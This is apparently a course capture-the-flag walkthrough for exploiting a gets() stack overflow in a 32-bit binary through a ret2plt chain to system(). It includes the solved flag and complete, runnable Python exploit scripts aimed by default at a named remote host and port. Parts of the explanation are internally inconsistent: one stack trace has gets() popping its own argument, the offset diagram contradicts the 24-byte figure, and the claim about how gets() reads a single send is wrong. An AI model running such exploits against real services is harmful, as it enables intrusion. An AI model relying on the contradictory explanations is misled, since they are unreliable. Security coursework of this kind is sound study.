# Attack Binary Ret2PLT Walkthrough

## Overview
**Vulnerability:** Stack buffer overflow via `gets()` in 32-bit binary  
**Target:** `moa6.eecs.utk.edu:9995`  
**Method:** Return-to-PLT chain (ret2plt) with two-stage `gets()` + `system()` gadgets  
**Flag:** `cosc466-flag-{EkwrwC26jrWfffn8nUvMRq5Q}`

---

## Vulnerability

The `cmd()` function in `attack.c` uses `gets(buffer)` to read a 12-byte buffer with no bounds checking. Input longer than 12 bytes overwrites the saved return address on the stack, allowing code execution redirection.

---

## Key Addresses & Offsets

| Item | Address |
|------|---------|
| Buffer size | 12 bytes |
| Offset to EIP | 24 bytes |
| `gets@plt` | `0x08049070` |
| `system@plt` | `0x080490a0` |
| `exit@plt` | `0x080490b0` |
| `pop ebx; ret` gadget | `0x0804901e` |
| Writable memory (`.bss`) | `0x0804c140` |

---  

## Using the Script

### Quick Start (Remote)
```bash
cd /home/judah/CS466
python3 ctf/13-attack-ret2libc/exploit.py
```

### Against Local Binary
```bash
python3 ctf/13-attack-ret2libc/exploit.py --local
```

### Custom Command
```bash
python3 ctf/13-attack-ret2libc/exploit.py --command "ls -la"
```

### Custom Remote Target
```bash
python3 ctf/13-attack-ret2libc/exploit.py --host example.com --port 9995
```

---

## Manual Exploitation (By Hand)

### The Big Picture: What We're Trying To Do

The binary has a `gets()` vulnerability—it reads unlimited input into a 12-byte buffer. Normally this would just crash the program, but we're going to **use the overflow to redirect execution** to a chain of library functions that let us run a command.

Here's the key insight: **We can't directly use `system()` because we need to give it an argument (the command string).** But the vulnerable `gets()` can read that argument for us! So our exploit has two stages:

1. **First overflow:** Call `gets()` to read a command string into writable memory
2. **Then:** Call `system()` with that memory address, which will execute the command

---

### Step 1: Understand the Stack Layout

When the `cmd()` function is called, the stack looks like this:

```
Higher addresses (top of stack)
    ┌─────────────────────────────┐
    │   Return address to main    │  ← EIP (what we want to overwrite)
    ├─────────────────────────────┤
    │   Saved frame pointer (EBP) │  ← 4 bytes
    ├─────────────────────────────┤
    │   Local variables/padding   │  ← varies, typically 8 bytes
    ├─────────────────────────────┤
    │   Buffer (12 bytes)         │  ← Where gets() reads input
    │   buffer[0]                 │
    │   buffer[1]                 │
    │   ...                       │
    │   buffer[11]                │
    └─────────────────────────────┘
Lower addresses (bottom of stack)
```

The buffer is 12 bytes. Above it are 4 bytes of saved EBP, and then the return address (EIP).

**Key calculation:** To reach the return address:
- 12 bytes past the start of the buffer (to fill the buffer)
- +4 bytes to skip over the saved EBP
- +8 bytes of compiler padding/alignment
- = **24 bytes total to reach EIP**

So if we send 24 bytes of junk followed by an address, that address will be where the function returns to.

---

### Step 2: The Function Chain Explained

We want to call three functions in sequence. **On 32-bit x86, function arguments are passed on the stack**, not in registers. The calling convention looks like this:

```
BEFORE a function call:
    ┌──────────────────┐
    │  Argument 2      │  ← pushed last
    ├──────────────────┤
    │  Argument 1      │  ← pushed second
    ├──────────────────┤
    │  Return address  │  ← pushed by the CALL instruction
    └──────────────────┘
```

When the function executes, it can find its arguments on the stack. But here's the problem: **if we chain functions naively, the return address from the first function will be garbage**, and when the second function tries to return, it will crash.

**The solution:** Use a "pop; ret" gadget between function calls. This gadget:
1. `pop` - removes one value from the stack (the return address/junk)
2. `ret` - pops the next value from the stack and jumps to it (the next function)

This cleans up the stack between function calls.

---

### Step 3: Build the Payload Structure

Here's what we need to do step-by-step:

#### Sub-step 3a: Fill the Buffer and Reach EIP
```
[12 bytes: buffer filler] + [4 bytes: junk to skip EBP] + [8 bytes: alignment padding]
= 24 bytes total
```

Any 24 bytes work here—they get written into the buffer and don't affect execution.

#### Sub-step 3b: First Function Call — `gets@plt`

After the 24 bytes, we write the address of `gets()` in the PLT:
```
[address of gets@plt: 0x08049070]
```

When the overflow happens, the CPU will jump here and execute `gets()`.

But `gets()` needs an argument! On 32-bit x86, the argument goes on the stack **after the return address**. So after writing `gets@plt`, we write:
```
[address of pop; ret gadget: 0x0804901e]  ← This is the "return address" for gets()
[address where gets() should read: 0x0804c140]  ← This is the argument to gets()
```

When `gets()` finishes and tries to return, it will pop `0x0804901e` (the pop; ret gadget). The gadget will:
- `pop` - removes 0x0804c140 from the stack (and puts it in a register)
- `ret` - pops the next value and jumps to it

That next value is the address of our second function.

#### Sub-step 3c: Second Function Call — `system@plt`

After the pop; ret gadget, we need to write where execution should go next—and we want it to be `system()`:
```
[address of system@plt: 0x080490a0]
[address of exit@plt: 0x080490b0]  ← The "return address" for system()
[address where the command string is: 0x0804c140]  ← The argument to system()
```

When `system()` finishes, it will return to `exit()` (which cleans up).

---

### Step 4: Convert Addresses to Raw Bytes

All addresses on 32-bit systems are 4 bytes. We write them in **little-endian** format (least significant byte first):

```
0x08049070 (gets@plt)     → 70 90 04 08
0x0804901e (pop; ret)     → 1e 90 04 08
0x0804c140 (writable mem) → 40 c1 04 08
0x080490a0 (system@plt)   → a0 90 04 08
0x080490b0 (exit@plt)     → b0 90 04 08
```

---

### Step 5: The Complete Payload

**First, send over the socket (all in one go):**

```
[24 bytes of padding]
[70 90 04 08]           ← gets@plt
[1e 90 04 08]           ← pop; ret (return address for gets)
[40 c1 04 08]           ← writable address (argument to gets)
[a0 90 04 08]           ← system@plt
[b0 90 04 08]           ← exit@plt
[40 c1 04 08]           ← writable address (argument to system)
```

In Python, this might look like:
```python
import struct

payload = b"A" * 24  # 24 bytes padding
payload += struct.pack("<I", 0x08049070)  # gets@plt
payload += struct.pack("<I", 0x0804901e)  # pop; ret gadget
payload += struct.pack("<I", 0x0804c140)  # writable mem (arg to gets)
payload += struct.pack("<I", 0x080490a0)  # system@plt
payload += struct.pack("<I", 0x080490b0)  # exit@plt
payload += struct.pack("<I", 0x0804c140)  # writable mem (arg to system)

sock.send(payload)
```

**Then, send the command on a new line:**

After sending the overflow payload, immediately send the command you want to execute:
```
cat flag.txt
```

This will be read by `gets()` into memory at `0x0804c140`, and then `system()` will execute it.

---

### Step 6: Execution Trace (What Actually Happens)

Here's the moment-by-moment execution:

```
1. Program reads our overflow payload with gets(buffer)
   → Buffer fills with our 24 bytes
   → Stack overflow occurs, EIP is overwritten
   
2. CPU jumps to 0x08049070 (gets@plt)
   → gets() reads the next line from input
   → gets() reads "cat flag.txt" into memory at 0x0804c140
   
3. gets() finishes, pops return address: 0x0804901e (pop; ret gadget)
   → Gadget pops 0x0804c140 off the stack
   → Gadget executes ret, which pops 0x080490a0
   
4. CPU jumps to 0x080490a0 (system@plt)
   → system() is called with argument 0x0804c140
   → system() reads the string "cat flag.txt" from that address
   → system() executes "cat flag.txt" in a shell
   → Flag is printed to stdout
   
5. system() finishes, pops return address: 0x080490b0 (exit@plt)
   → exit() is called with argument 0x0804c140
   → exit() terminates the process cleanly
```

---

### Step 7: Manual Testing with `printf` and `nc`

If you want to test this without Python, you can use basic shell tools:

```bash
# Create a file with the raw bytes (using printf for hex)
printf "\x41\x41\x41\x41...[24 bytes]...\x70\x90\x04\x08\x1e\x90\x04\x08..." > payload.bin

# Send it to the server
cat payload.bin - | nc moa6.eecs.utk.edu 9995
# The "- " at the end lets you type the command interactively
```

Then type:
```
cat flag.txt
```

And the server will execute it.

---

## How It Works (Technical Deep Dive)

### The Core Problem

Normally, when we overflow a buffer and hijack the return address, we can make the program jump to shell code we provide. But **we don't have shell code here**—we only have the ability to redirect execution to existing functions in the binary's PLT (Procedure Linkage Table).

The PLT contains stub code that calls library functions like `gets()` and `system()`. These functions are designed to take arguments, but those arguments must be passed according to the x86 calling convention.

### The x86-32 Calling Convention (cdecl)

On 32-bit x86 systems using the cdecl calling convention:
- **Arguments are passed on the stack** (not in registers)
- **The caller pushes arguments in reverse order** (rightmost first)
- **The caller cleans up the stack** after the function returns
- **Return values come back in EAX**

Example: to call `system("cat flag.txt")`:
```
push "cat flag.txt address"   ← argument goes on stack
call system@plt               ← CPU pushes return address and jumps
[system() executes]
[system() executes ret, pops return address]
```

### Why We Need the pop; ret Gadget

When we chain two functions, the return address from the first function is on the stack when the first function returns. Without cleanup, the CPU will try to use that garbage return address to jump to the second function.

Example of the problem:
```
Stack after first overflow (calling gets):
    ┌─────────────────────────────┐
    │  0x0804c140 (arg to gets)   │  ← SP+0
    ├─────────────────────────────┤
    │  0x080490a0 (system@plt)    │  ← SP+4 (this is where we want to go)
    ├─────────────────────────────┤
    │  0x080490b0 (exit@plt)      │  ← SP+8
    ├─────────────────────────────┤
    │  0x0804c140 (arg to system) │  ← SP+12
    └─────────────────────────────┘

When gets() executes "ret":
    - It pops the top of stack (0x0804c140)
    - Tries to jump to 0x0804c140 (this is NOT code, will crash!)
```

The `pop; ret` gadget fixes this by consuming the garbage value:
```
When we use "pop ebx; ret" gadget at 0x0804901e:
    pop     ← removes 0x0804c140 from stack, stores in ebx (we don't care)
    ret     ← pops the NEW top of stack (0x080490a0 = system@plt)
            ← jumps to system@plt
```

Now the stack is clean and execution flows to the next function.

### Why Writable Memory Matters

The address `0x0804c140` is in the `.bss` section (writable data segment) of the binary. It's:
- **Readable:** so `system()` can read the command string
- **Writable:** so `gets()` can write the command string there
- **Predictable:** doesn't change between runs (no ASLR on this system)

If we tried to use a read-only address (like code), `gets()` would crash trying to write to it.

### The Full Execution Flow

```
1. Overflow happens, EIP is overwritten with 0x08049070 (gets@plt)

2. CPU jumps to gets@plt
   Stack:
   ┌─────────────────────────────┐
   │  0x0804c140                 │  ← argument to gets
   ├─────────────────────────────┤
   │  0x0804901e (pop; ret)      │  ← return address
   ├─────────────────────────────┤
   │  [more stack]               │
   └─────────────────────────────┘

3. gets() executes
   - Reads from the socket/stdin
   - Stores input at 0x0804c140
   - Input: "cat flag.txt"

4. gets() finishes and returns
   - pops 0x0804c140 (discards it)
   - Then pops 0x0804901e (the pop; ret gadget)
   - Jumps to 0x0804901e

5. pop; ret gadget executes
   - pops 0x080490a0 (system@plt)
   - Returns to 0x080490a0

6. CPU jumps to system@plt
   Stack:
   ┌─────────────────────────────┐
   │  0x0804c140 (arg to system) │  ← argument points to "cat flag.txt"
   ├─────────────────────────────┤
   │  0x080490b0 (exit@plt)      │  ← return address
   ├─────────────────────────────┤
   │  [more stack]               │
   └─────────────────────────────┘

7. system() executes
   - Reads argument from stack: 0x0804c140
   - Loads string from that address: "cat flag.txt"
   - Executes it in a shell
   - Flag is printed

8. system() returns
   - pops 0x080490b0 (exit@plt)
   - Jumps to 0x080490b0

9. exit() runs and terminates cleanly
```

### Common Mistakes to Avoid

1. **Wrong byte order:** Addresses must be in little-endian format (least significant byte first)
   - WRONG: `08 04 90 70` (big-endian)
   - RIGHT: `70 90 04 08` (little-endian)

2. **Off-by-4 errors:** Make sure you understand the calling convention. The address you write at offset 24 is where execution jumps to, not an argument.

3. **Forgetting the pop; ret gadget:** Without it, the stack alignment will be wrong and execution will jump to garbage.

4. **Using read-only memory for `gets()` argument:** Will segfault when `gets()` tries to write there.

5. **Not sending the command string after the overflow:** The command must be sent after the overflow payload so that `gets()` in the exploit can read it.

### Writing Your Own Script

The key algorithm is:
1. Pack 24 bytes of padding
2. Pack each address as a 4-byte little-endian integer: `struct.pack("<I", address)`
3. Arrange the function calls with pop; ret in between
4. Send the payload over a socket
5. Send the command string on the next line
6. Read the response

```python
import struct
import socket

def exploit(host, port, command):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Build payload
    payload = b"A" * 24  # padding to reach EIP
    payload += struct.pack("<I", 0x08049070)  # gets
    payload += struct.pack("<I", 0x0804901e)  # pop; ret
    payload += struct.pack("<I", 0x0804c140)  # arg: writable mem
    payload += struct.pack("<I", 0x080490a0)  # system
    payload += struct.pack("<I", 0x080490b0)  # exit
    payload += struct.pack("<I", 0x0804c140)  # arg: writable mem
    
    # Send overflow
    sock.send(payload + b"\n")
    
    # Send command
    sock.send((command + "\n").encode())
    
    # Read response
    response = sock.recv(4096)
    print(response.decode())
    
    sock.close()

exploit("moa6.eecs.utk.edu", 9995, "cat flag.txt")
```

---

## Finding the Addresses (How to Solve Similar Challenges)

### Find the Buffer Offset

Run the binary locally with a debugger:

```bash
gdb ./attack
(gdb) run
```

Send a long input (like 100 'A's). The binary will crash with a segmentation fault. Use the debugger to see where the crash happens. The offset calculation is usually:
- Buffer size (from source or static analysis)
- +4 bytes for saved EBP
- +compiler padding (usually 4-8 bytes)

You can also brute force it by sending inputs of increasing length until you can control EIP.

### Find PLT Addresses

Use `objdump` to find function addresses in the PLT:

```bash
objdump -d ./attack | grep -A3 "gets@plt"
objdump -d ./attack | grep -A3 "system@plt"
objdump -d ./attack | grep -A3 "exit@plt"
```

Output looks like:
```
08049070 <gets@plt>:
 8049070:   ff 25 0c c0 04 08       jmp    *0x804c00c
```

The address `08049070` is what you write in the payload.

### Find the pop; ret Gadget

Use `objdump` to search for useful gadgets:

```bash
objdump -d ./attack | grep -B1 "ret"
```

Look for lines like `pop ebx; ret` or similar. The address right after the instruction is what you need.

Alternatively, use `ropper`:
```bash
ropper --file ./attack --search "pop.*ret"
```

### Find Writable Memory

Use `objdump` to find the `.bss` section:

```bash
objdump -h ./attack | grep -A3 ".bss"
```

Any address in the `.bss` section is writable. The start of `.bss` is usually a good choice.

### Verify Addresses with a Debugger

Once you have the addresses, test them:

```bash
gdb ./attack
(gdb) disassemble gets@plt
(gdb) x/4i 0x08049070
(gdb) x/x 0x0804c140
```

---

## Writing the Exploit Script: A Complete Annotated Example

Here's a fully commented example that implements the concepts we discussed:

```python
#!/usr/bin/env python3
import struct
import socket
import sys

def build_payload(command="cat flag.txt"):
    """
    Builds the ROP chain that calls gets() then system().
    
    Returns: bytes object containing the full payload
    """
    
    # ===== Padding to reach EIP =====
    # 12 bytes buffer + 4 bytes EBP + 8 bytes alignment = 24 bytes
    payload = b"A" * 24
    
    # ===== First function: gets() =====
    # When we overflow, the CPU will jump to the gets@plt address
    payload += struct.pack("<I", 0x08049070)  # gets@plt
    
    # gets() expects one argument on the stack: where to read into
    # But first, we need a "return address" for gets()
    # We use the pop; ret gadget as a clean return point
    payload += struct.pack("<I", 0x0804901e)  # pop ebx; ret gadget
    
    # This is the argument to gets(): the writable address where the command goes
    payload += struct.pack("<I", 0x0804c140)  # writable .bss memory
    
    # ===== Second function: system() =====
    # After gets() returns and the pop; ret gadget cleans the stack,
    # execution jumps to system()
    payload += struct.pack("<I", 0x080490a0)  # system@plt
    
    # system() also expects a return address and an argument
    # Use exit as the return address for clean termination
    payload += struct.pack("<I", 0x080490b0)  # exit@plt
    
    # The argument to system(): same writable address where gets() wrote
    payload += struct.pack("<I", 0x0804c140)  # argument to system()
    
    return payload


def exploit(host, port, command="cat flag.txt"):
    """
    Connects to the remote binary and exploits it.
    
    Args:
        host: Target host/IP
        port: Target port
        command: Shell command to execute on the remote system
    """
    
    # Connect to the target
    print(f"[*] Connecting to {host}:{port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    print("[+] Connected!")
    
    # Build the payload
    print("[*] Building payload...")
    payload = build_payload(command)
    
    # Send the overflow payload
    # The binary's gets() call will receive this and overflow
    print("[*] Sending overflow payload...")
    sock.send(payload + b"\n")
    
    # The program is now in our ROP chain:
    # gets@plt is called and waits for input
    
    # Send the command that gets() will read
    print(f"[*] Sending command: {command}")
    sock.send((command + "\n").encode())
    
    # Read the response
    # system() will execute our command and output goes to the socket
    print("[*] Reading response...")
    response = b""
    while True:
        try:
            chunk = sock.recv(1024)
            if not chunk:
                break
            response += chunk
        except socket.timeout:
            break
    
    sock.close()
    
    # Print the flag
    print("[+] Response:")
    print(response.decode('utf-8', errors='ignore'))
    
    return response


def exploit_local(binary_path, command="cat flag.txt"):
    """
    Exploits a local binary (for testing).
    
    Args:
        binary_path: Path to the local binary
        command: Shell command to execute
    """
    import subprocess
    
    print(f"[*] Exploiting local binary: {binary_path}")
    
    payload = build_payload(command)
    
    # Start the binary and send input
    proc = subprocess.Popen(
        [binary_path],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    # Send payload + newline + command
    input_data = payload + b"\n" + (command + "\n").encode()
    stdout, stderr = proc.communicate(input=input_data, timeout=5)
    
    print("[+] Response:")
    print(stdout.decode('utf-8', errors='ignore'))
    
    return stdout


if __name__ == "__main__":
    # Usage examples:
    # python3 exploit.py                    # Default: remote, cat flag.txt
    # python3 exploit.py --local ./attack   # Local binary
    # python3 exploit.py --host example.com --port 9999 --command "ls -la"
    
    import argparse
    
    parser = argparse.ArgumentParser(description="Exploit ret2plt/ret2libc vulnerability")
    parser.add_argument("--host", default="moa6.eecs.utk.edu", help="Target host")
    parser.add_argument("--port", type=int, default=9995, help="Target port")
    parser.add_argument("--command", default="cat flag.txt", help="Command to execute")
    parser.add_argument("--local", help="Exploit local binary instead of remote")
    
    args = parser.parse_args()
    
    if args.local:
        exploit_local(args.local, args.command)
    else:
        exploit(args.host, args.port, args.command)
```

### Understanding Each Section

**`build_payload()`:**
- Constructs the exact byte sequence we need to send
- `struct.pack("<I", ...)` converts a 32-bit address to 4 bytes in little-endian format
- The order of addresses is crucial: it matches the ROP chain execution order

**`exploit()`:**
- Opens a socket to the target
- Sends the overflow payload followed by a newline
- Sends the command on the next line (for `gets()` to read)
- Receives and prints the output

**Key insight:** The two `send()` calls are critical:
1. First `send()`: The binary's `gets(buffer)` reads this and overflows
2. Second `send()`: Our ROP chain's `gets()` call reads this and stores it

If you send both at once, the first `gets()` will consume both lines and our exploit won't work.

### Testing Locally

```bash
# Test with the local binary first
python3 exploit.py --local ./attack --command "id"

# Then test remote
python3 exploit.py --command "whoami"
```

### Debugging If It Doesn't Work

Add verbose output:

```python
print("[DEBUG] Payload hex:", payload.hex())
print("[DEBUG] Payload length:", len(payload))
print("[DEBUG] First 50 bytes:", payload[:50].hex())
```

Common issues:
- **Binary crashes immediately:** Wrong offset calculation (not 24 bytes)
- **Garbage output:** Addresses are wrong or using big-endian instead of little-endian
- **Command doesn't execute:** Forgot to send the second line, or writable address is wrong
- **Timeout:** The binary is waiting for more input (socket not closing properly)
